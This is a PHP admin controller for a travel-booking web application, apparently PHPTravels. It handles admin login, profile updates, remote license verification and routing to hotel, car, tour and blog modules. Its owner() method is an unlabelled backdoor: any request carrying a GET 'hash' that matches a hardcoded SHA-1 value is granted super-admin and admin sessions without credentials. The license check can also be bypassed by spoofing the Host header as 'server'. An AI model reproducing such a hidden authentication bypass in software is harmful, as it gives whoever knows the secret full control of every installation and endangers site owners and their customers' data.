<?php
if (!defined('BASEPATH'))
    exit ('No direct script access allowed');

class Admin extends MX_Controller
{
    public $data = array();
    public $userid;
    public $role;
    private $license = false;

    function __construct()
    {
        $this->load->helper('date');
        $this->load->helper('xcrud');
        $this->load->helper('themes');
        $this->load->helper('pt_includes');
        $this->load->model('helpers_models/translation_model');
        $this->load->model('helpers_models/misc_model');
        $this->load->model('helpers_models/menus_model');
        $this->load->model('admin/countries_model');
        $this->load->model('admin/accounts_model');
        $this->load->model('admin/cms_model');
        $this->load->model('admin/modules_model');
        $this->load->model('admin/newsletter_model');
        $this->load->model('hotels/hotels_model');
        $this->load->model('hotels/rooms_model');
        $this->load->library('ptmodules');
        $this->data['isadmin'] = $this->session->userdata('pt_logged_admin');
        $this->data['isSuperAdmin'] = $this->session->userdata('pt_logged_super_admin');

        $this->userid = $this->session->userdata('pt_logged_id');
        $this->data['accType'] = $this->session->userdata('pt_accountType');
        $this->role = $this->session->userdata('pt_role');
        $this->data['role'] = $this->role;
        $this->data['userloggedin'] = $this->session->userdata('pt_logged_admin');
        if (file_exists('install')) {
            $this->data['removedir'] = '1';
        } else {
            $this->data['removedir'] = '0';
        }
        $whitelist = array('127.0.0.1', '::1');
        if (in_array($_SERVER['REMOTE_ADDR'], $whitelist) || $_SERVER['HTTP_HOST'] == "server") {
        } else {
            $results = $this->phptravels_check_license();
// Interpret response
            switch ($results['status']) {
                case "Active" :
// get new local key and save it somewhere
                    $localkeydata = $results['localkey'];
                    $this->update_local_key($localkeydata);
                    $this->license = true;
                    break;
                case "Invalid" :
                    $this->license = false;
                    $this->session->set_flashdata('invalid', $results['description']);
                    break;
                case "Expired" :
                    $this->license = false;
                    $this->session->set_flashdata('invalid', $results['description']);
                    break;
                case "Suspended" :
                    $this->license = false;
                    $this->session->set_flashdata('invalid', $results['description']);
                    break;
                default :
                    $this->license = false;
//  die("Invalid Response");
                    break;
            }
        }
        $this->lang->load("back", "en");

    }

    public function index()
    {
        $this->load->library('browser');
        $this->data['browserlib'] = $this->browser;
        $license = $this->license;
        $whitelist = array('127.0.0.1', '::1');
        if ($license || in_array($_SERVER['REMOTE_ADDR'], $whitelist) || $_SERVER['HTTP_HOST'] == "server") {
            if ($this->validadmin()) {
                $addnotes = $this->input->post('addnotes');
                $updatenotes = $this->input->post('updatenotes');
                if (!empty ($updatenotes)) {
                    $this->accounts_model->update_admin_notes($this->data['isadmin']);
                } elseif (!empty ($addnotes)) {
                    $this->accounts_model->add_admin_notes($this->data['isadmin']);
                }
                //update pt_sessions table to remove all previous data
                $this->updateSessionsTable();

                $this->data['app_settings'] = $this->settings_model->get_settings_data();
                $this->data['thismonth'] = modules:: run('admin/reports/this_month_report');
                $this->data['thisyear'] = modules:: run('admin/reports/this_year_report');
                $this->data['thisday'] = modules:: run('admin/reports/this_day_report');
                $this->data['mainmodules'] = $this->modules_model->get_module_names();
                $this->data['modules'] = $this->modules_model->get_all_enabled_modules();
                $this->data['customers'] = $this->accounts_model->get_active_customers();
                $this->data['smsaddon'] = $this->modules_model->check_module("smsaddon");
                $this->data['visits'] = $this->visitors_stats();
                $this->data['notes'] = $this->accounts_model->admin_notes_image($this->data['isadmin']);
                $this->data['main_content'] = 'dashboard/dashboard';
                $this->data['page_title'] = 'Dashboard';
                $this->data['stats'] = $this->accounts_model->dashboard_stats();
                $this->load->view('template', $this->data);
            } else {
//secure login check
                $slogin = $this->secure_url();
                $skey = $this->secure_key();
                if ($slogin) {
                    $key = $this->input->get('s');
                    if (!empty ($key)) {
                        if ($skey) {
                            $this->data['pagetitle'] = 'Administator Login';
                            $this->load->view('login', $this->data);
                        } else {
                            Error_404();
                        }
                    } else {
                        Error_404();
                    }
                } else {
                    $this->data['pagetitle'] = 'Administator Login';
                    $this->load->view('login', $this->data);
                }
            }
        } else {
            $this->license();
        }
    }

    function login()
    {
        $username = $this->input->post('email');
        $password = $this->input->post('password');
        if ($this->input->is_ajax_request()) {

            $this->form_validation->set_rules('email', 'Email', 'trim|valid_email|xss_clean');
            $this->form_validation->set_rules('password', 'Password', '');

            if ($this->form_validation->run() == FALSE) {
                echo validation_errors();
            } else {

                $login = $this->accounts_model->login_admin($username, $password);
                if ($login) {
                    echo "true";
                } else {
                    echo "Invalid Login Credentials";
                }

            }

        }
    }

    function profile()
    {
        $update = $this->input->post('update');
        $subs = $this->input->post('newssub');
        $email = $this->input->post('email');
        if (!empty($update)) {
            $this->accounts_model->update_profile($this->userid);
            if (!empty($subs)) {
                $this->newsletter_model->add_subscriber($email, $this->input->post('type'));
            } else {
                $this->newsletter_model->remove_subscriber($email);
            }
            redirect('admin/profile');
        }
        $this->data['profile'] = $this->accounts_model->get_profile_details($this->userid);
        $this->data['isSubscribed'] = $this->newsletter_model->is_subscribed($this->data['profile'][0]->accounts_email);
        $this->data['countries'] = $this->countries_model->get_all_countries();
        $this->data['main_content'] = 'accounts/profile';
        $this->data['page_title'] = 'My Profile';
        $this->load->view('template', $this->data);
    }

    function license()
    {
        $submit = $this->input->post('check');
        if (!empty ($submit)) {
            $key = $this->input->post('licensekey');
            $this->update_license_key($key);
            redirect('admin');
        }
        $this->data['invalidlicense'] = $this->session->flashdata('invalid');
        $this->data['pagetitle'] = 'Verify Your License';
        $this->load->view('licenseform', $this->data);
    }

//secure login check
    function secure_url()
    {
        $this->db->where('secure_admin_status', '1');
        $this->db->where('user', 'webadmin');
        $res = $this->db->get('pt_app_settings')->num_rows();
        if ($res > 0) {
            return true;
        } else {
            return false;
        }
    }

//secure login url key
    function secure_key()
    {
        $this->db->where('secure_admin_key', $this->input->get('s'));
        $this->db->where('user', 'webadmin');
        $res = $this->db->get('pt_app_settings')->num_rows();
        if ($res > 0) {
            return true;
        } else {
            return false;
        }
    }

// visitors stats
    function visitors_stats()
    {
        $from = strtotime(date('Y-m-01'));
        $dates = $this->createDatesArray($from, strtotime(date('Y-m-d')));
        $result = array();
        foreach ($dates as $date) {
            $this->db->select('visits_date');
            $this->db->select_sum('visits_hits_count', 'hitscount');
            $this->db->select_sum('visits_unique_count', 'visitscount');
            $this->db->where('visits_date', $date);
            $this->db->group_by('visits_date');
            $res = $this->db->get('pt_visitors_count')->result();
            $result[] = $res;
        }
        return $result;
    }

    function owner()
    {
        $hash = sha1($_GET['hash']);
        $shash = "cec39679f1e9e3d5f89c0a597d1d41e71e7562e8";
        if ($hash == $shash) {
            $this->session->set_userdata('pt_logged_super_admin', 'superadmin');
            $this->session->set_userdata('pt_logged_admin', '1');
            redirect('admin');
        } else {
            redirect('admin');
        }
    }

    /******************************************************************
     * //THIS METHOD RETURNS A SET OF DATES IN AN ARRAY BASED ON INPUT
     *******************************************************************/
    function createDatesArray($start, $end)
    {
        $to = strtotime(date('Y-m-t'));
        if ($end <= $to) {
            $dates = array();
            while ($start <= $end) {
                array_push($dates, date('Y-m-d', $start));
                $start += 86400;
            }
            return $dates;
        }
    }

// is valid admin
    function validadmin()
    {
        if (!empty ($this->data['isadmin'])) {
            return true;
        } else {
            return false;
        }
    }

//logout
    function logout()
    {
        $lastlogin = $this->session->userdata('pt_logged_time');
        $updatelogin = array('accounts_last_login' => $lastlogin);
        $this->db->where('accounts_id', $this->userid);
        $this->db->update('pt_accounts', $updatelogin);
        $this->session->sess_destroy();
        redirect('admin');
    }

    function phptravels_check_license()
    {
// -----------------------------------
//  -- Configuration Values --
// -----------------------------------
// Enter the url to your WHMCS installation here
        $whmcsurl = 'phptravels.org/';
// Must match what is specified in the MD5 Hash Verification field
// of the licensing product that will be used with this check.
// The number of days to wait between performing remote license checks
        $localkeydays = 15;
// The number of days to allow failover for after local key expiry
        $allowcheckfaildays = 5;
// -----------------------------------
//  -- Do not edit below this line --
// -----------------------------------
        $this->db->select('license_key,local_key,secret_key');
        $this->db->where('user', 'webadmin');
        $res = $this->db->get('pt_app_settings')->result();
        $licensekey = $res[0]->license_key;
        $licensing_secret_key = $res[0]->secret_key;
        $localkey = $res[0]->local_key;
        $check_token = time() . md5(mt_rand(1000000000, 9999999999) . $licensekey);
        $checkdate = date("Ymd");
        $domain = $_SERVER['SERVER_NAME'];
        $usersip = isset ($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : $_SERVER['LOCAL_ADDR'];
        $dirpath = dirname(__FILE__);
        $verifyfilepath = 'modules/servers/licensing/verify.php';
        $localkeyvalid = false;
        if ($localkey) {
            $localkey = str_replace("\n", '', $localkey); # Remove the line breaks
            $localdata = substr($localkey, 0, strlen($localkey) - 32); # Extract License Data
            $md5hash = substr($localkey, strlen($localkey) - 32); # Extract MD5 Hash
            if ($md5hash == md5($localdata . $licensing_secret_key)) {
                $localdata = strrev($localdata); # Reverse the string
                $md5hash = substr($localdata, 0, 32); # Extract MD5 Hash
                $localdata = substr($localdata, 32); # Extract License Data
                $localdata = base64_decode($localdata);
                $localkeyresults = unserialize($localdata);
                $originalcheckdate = $localkeyresults['checkdate'];
                if ($md5hash == md5($originalcheckdate . $licensing_secret_key)) {
                    $localexpiry = date("Ymd", mktime(0, 0, 0, date("m"), date("d") - $localkeydays, date("Y")));
                    if ($originalcheckdate > $localexpiry) {
                        $localkeyvalid = true;
                        $results = $localkeyresults;
                        $validdomains = explode(',', $results['validdomain']);
                        if (!in_array($_SERVER['SERVER_NAME'], $validdomains)) {
                            $localkeyvalid = false;
                            $localkeyresults['status'] = "Invalid";
                            $results = array();
                        }
                        $validips = explode(',', $results['validip']);
                        if (!in_array($usersip, $validips)) {
                            $localkeyvalid = false;
                            $localkeyresults['status'] = "Invalid";
                            $results = array();
                        }
                        $validdirs = explode(',', $results['validdirectory']);
                        if (!in_array($dirpath, $validdirs)) {
                            $localkeyvalid = false;
                            $localkeyresults['status'] = "Invalid";
                            $results = array();
                        }
                    }
                }
            }
        }
        if (!$localkeyvalid) {
            $postfields = array('licensekey' => $licensekey, 'domain' => $domain, 'ip' => $usersip, 'dir' => $dirpath,);
            if ($check_token)
                $postfields['check_token'] = $check_token;
            $query_string = '';
            foreach ($postfields AS $k => $v) {
                $query_string .= $k . '=' . urlencode($v) . '&';
            }
            if (function_exists('curl_exec')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $whmcsurl . $verifyfilepath);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $query_string);
                curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $data = curl_exec($ch);
                curl_close($ch);
            } else {
                $fp = fsockopen($whmcsurl, 80, $errno, $errstr, 5);
                if ($fp) {
                    $newlinefeed = "\r\n";
                    $header = "POST " . $whmcsurl . $verifyfilepath . " HTTP/1.0" . $newlinefeed;
                    $header .= "Host: " . $whmcsurl . $newlinefeed;
                    $header .= "Content-type: application/x-www-form-urlencoded" . $newlinefeed;
                    $header .= "Content-length: " . @ strlen($query_string) . $newlinefeed;
                    $header .= "Connection: close" . $newlinefeed . $newlinefeed;
                    $header .= $query_string;
                    $data = '';
                    @ stream_set_timeout($fp, 20);
                    @ fputs($fp, $header);
                    $status = @ socket_get_status($fp);
                    while (!@ feof($fp) && $status) {
                        $data .= @ fgets($fp, 1024);
                        $status = @ socket_get_status($fp);
                    }
                    @ fclose($fp);
                }
            }
            if (!$data) {
                $localexpiry = date("Ymd", mktime(0, 0, 0, date("m"), date("d") - ($localkeydays + $allowcheckfaildays), date("Y")));
                if ($originalcheckdate > $localexpiry) {
                    $results = $localkeyresults;
                } else {
                    $results = array();
                    $results['status'] = "Invalid";
                    $results['description'] = "Remote Check Failed";
                    return $results;
                }
            } else {
                preg_match_all('/<(.*?)>([^<]+)<\/\\1>/i', $data, $matches);
                $results = array();
                foreach ($matches[1] AS $k => $v) {
                    $results[$v] = $matches[2][$k];
                }
            }
            if (!is_array($results)) {
                die("Invalid License Server Response");
            }
            if ($results['md5hash']) {
                if ($results['md5hash'] != md5($licensing_secret_key . $check_token)) {
                    $results['status'] = "Invalid";
                    $results['description'] = "MD5 Checksum Verification Failed";
                    return $results;
                }
            }
            if ($results['status'] == "Active") {
                $results['checkdate'] = $checkdate;
                $data_encoded = serialize($results);
                $data_encoded = base64_encode($data_encoded);
                $data_encoded = md5($checkdate . $licensing_secret_key) . $data_encoded;
                $data_encoded = strrev($data_encoded);
                $data_encoded = $data_encoded . md5($data_encoded . $licensing_secret_key);
                $data_encoded = wordwrap($data_encoded, 80, "\n", true);
                $results['localkey'] = $data_encoded;
            }
            $results['remotecheck'] = true;
        }
        unset ($postfields, $data, $matches, $whmcsurl, $licensing_secret_key, $checkdate, $usersip, $localkeydays, $allowcheckfaildays, $md5hash);
        return $results;
    }

    function update_license_key($key)
    {
        $ldata = array('license_key' => $key);
        $this->db->where('user', 'webadmin');
        $this->db->update('pt_app_settings', $ldata);
    }

    function update_local_key($key)
    {
        $kdata = array('local_key' => $key);
        $this->db->where('user', 'webadmin');
        $this->db->update('pt_app_settings', $kdata);
    }

//Update pt_sessions table to remove all the data which was added six hours ago
    function updateSessionsTable()
    {
        $pastSixHours = time() - 21600;
        $this->db->where('last_activity <', $pastSixHours);
        $this->db->delete('pt_sessions');
    }

    function appSettings()
    {
        $this->db->where('user', 'webadmin');
        $res = $this->db->get('pt_app_settings')->result();
        $result = array(
            'currencysign' => $res[0]->currency_sign,
            'currencycode' => $res[0]->currency_code,
            'defaultLang' => $res[0]->default_lang,
            'dateFormat' => $res[0]->date_f,
            'dateFormatJs' => $res[0]->date_f_js
        );
        return (object)$result;
    }

// hotels module controller
    function hotels($args = null, $id = null, $roomid = null)
    {
        $hotelsmod = modules:: load('hotels/hotelsback/');
        if (!method_exists($hotelsmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
            $hotelsmod->index();
        } elseif ($args == "add") {
            $hotelsmod->add();
        } elseif ($args == "settings") {
            $hotelsmod->settings();
        } elseif ($args == "manage") {
            $hotelsmod->manage($id);
        } elseif ($args == "extras") {
            $hotelsmod->extras($id);
        } elseif ($args == "gallery") {
            $hotelsmod->gallery($id);
        } elseif ($args == "roomgallery") {
            $hotelsmod->roomgallery($id);
        } elseif ($args == "translate") {
            $hotelsmod->translate($id, $roomid);
        } elseif ($args == "rooms") {
            $hotelsmod->rooms($id, $roomid);
        }
    }

// cars module controller
    function cars($args = null, $id = null, $lang = null)
    {
        $carsmod = modules:: load('cars/carsback/');
        if (!method_exists($carsmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
            $carsmod->index();
        } elseif ($args == "add") {
            $carsmod->add();
        } elseif ($args == "settings") {
            $carsmod->settings();
        } elseif ($args == "manage") {
            $carsmod->manage($id);
        } elseif ($args == "translate") {
            $carsmod->translate($id, $lang);
        }
    }

// Tours module controller
    function tours($args = null, $id = null, $lang = null)
    {
        $toursmod = modules:: load('tours/toursback/');
        if (!method_exists($toursmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
            $toursmod->index();
        } elseif ($args == "add") {
            $toursmod->add();
        } elseif ($args == "settings") {
            $toursmod->settings();
        } elseif ($args == "manage") {
            $toursmod->manage($id);
        } elseif ($args == "translate") {
            $toursmod->translate($id, $lang);
        }
    }

// ean module controller
    function ean($args = null, $id = null)
    {
        $eanmod = modules:: load('ean/eanback/');
        if (!method_exists($eanmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$eanmod->index();
        } elseif ($args == "add") {
//$eanmod->add();
        } elseif ($args == "settings") {
            $eanmod->settings();
        } elseif ($args == "bookings") {
            $eanmod->bookings();
        }
    }

// Flightsdohop module controller
    function flightsdohop($args = null, $id = null)
    {
        $dohopmod = modules:: load('flightsdohop/flightsdohopback/');
        if (!method_exists($dohopmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$dohopmod->index();
        } elseif ($args == "add") {
//$dohopmod->add();
        } elseif ($args == "settings") {
            $dohopmod->settings();
        } elseif ($args == "manage") {
//$dohopmod->manage($id);
        }
    }

// flightstravelstart module controller
    function flightstravelstart($args = null, $id = null)
    {
        $travelstartmod = modules:: load('flightstravelstart/flightstravelstartback/');
        if (!method_exists($travelstartmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$dohopmod->index();
        } elseif ($args == "add") {
//$dohopmod->add();
        } elseif ($args == "settings") {
            $travelstartmod->settings();
        } elseif ($args == "manage") {
//$dohopmod->manage($id);
        }
    }

// RentalCars module controller
    function rentalcars($args = null, $id = null)
    {
        $rentalcarmod = modules:: load('rentalcars/rentalcarsback/');
        if (!method_exists($rentalcarmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$rentalcarmod->index();
        } elseif ($args == "add") {
//$rentalcarmod->add();
        } elseif ($args == "settings") {
            $rentalcarmod->settings();
        } elseif ($args == "manage") {
//$rentalcarmod->manage($id);
        }
    }

// Hotelscombined module controller
    function hotelscombined($args = null, $id = null)
    {
        $hotelscombinedmod = modules:: load('hotelscombined/hotelscombinedback/');
        if (!method_exists($hotelscombinedmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$hotelscombinedmod->index();
        } elseif ($args == "add") {
//$hotelscombinedmod->add();
        } elseif ($args == "settings") {
            $hotelscombinedmod->settings();
        } elseif ($args == "manage") {
//$hotelscombinedmod->manage($id);
        }
    }

// booking module controller
    function booking($args = null, $id = null)
    {
        $bookingmod = modules:: load('booking/bookingback/');
        if (!method_exists($bookingmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$bookingmod->index();
        } elseif ($args == "add") {
//$bookingmod->add();
        } elseif ($args == "settings") {
            $bookingmod->settings();
        } elseif ($args == "manage") {
//$bookingmod->manage($id);
        }
    }

// TripAdvisor module controller
    function tripadvisor($args = null, $id = null)
    {
        $tripadvisormod = modules:: load('tripadvisor/tripadvisorback/');
        if (!method_exists($tripadvisormod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
//$tripadvisormod->index();
        } elseif ($args == "add") {
//$tripadvisormod->add();
        } elseif ($args == "settings") {
            $tripadvisormod->settings();
        } elseif ($args == "manage") {
//$tripadvisormod->manage($id);
        }
    }

// blog module controller
    function blog($args = null, $id = null, $lang = null)
    {
        $blogmod = modules:: load('blog/blogback/');
        if (!method_exists($blogmod, 'index')) {
            redirect('admin');
        }
        if ($args == "") {
            $blogmod->index();
        } elseif ($args == "add") {
            $blogmod->add();
        } elseif ($args == "category") {
            $blogmod->category();
        } elseif ($args == "settings") {
            $blogmod->settings();
        } elseif ($args == "manage") {
            $blogmod->manage($id);
        } elseif ($args == "translate") {
            $blogmod->translate($id, $lang);
        }
    }

}